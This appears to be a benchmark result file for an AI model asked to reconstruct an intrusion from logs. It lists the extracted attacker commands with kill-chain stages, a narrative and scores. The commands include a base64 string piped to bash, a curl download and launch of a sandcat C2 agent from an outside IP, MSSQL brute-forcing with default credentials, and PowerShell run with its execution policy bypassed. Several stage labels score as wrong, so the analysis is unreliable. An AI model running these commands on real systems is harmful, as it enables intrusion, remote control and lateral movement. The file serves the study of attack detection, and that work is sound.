@@ -1,0 +1,120 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ifconfig",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ping -c 1 10.67.200.200",
+        "stage": "Discovery"
+      },
+      {
+        "command": "arp -a",
+        "stage": "Discovery"
+      },
+      {
+        "command": "curl -O  http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Execution"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Execution"
+      },
+      {
+        "command": "nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c kill -9 $(lsof -i:8080 -t)",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "python -m SimpleHTTPServer 8079",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sh -c mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attackers gained an initial foothold through executing a bash script with a Base64 encoded string. Further execution involved downloading files via curl, changing their permissions, establishing a Command and Control channel, evading defenses, setting up persistence mechanisms, accessing and exploiting SQL databases, escalating privileges, collecting data, and moving laterally within the system.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 16699,
+      "completion_tokens": 2137,
+      "total_tokens": 18836,
+      "wall_clock_s": 78.994,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.35294117647058826,
+      "recall": 0.6666666666666666,
+      "f1": 0.46153846153846156,
+      "tp": 6,
+      "fp": 11,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.11764705882352941,
+      "recall": 0.2857142857142857,
+      "f1": 0.16666666666666666,
+      "tp": 2,
+      "fp": 15,
+      "fn": 5,
+      "recall_partial": 0.42857142857142855
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 16699,
+      "completion_tokens": 2137,
+      "total_tokens": 18836,
+      "wall_clock_s": 78.994,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
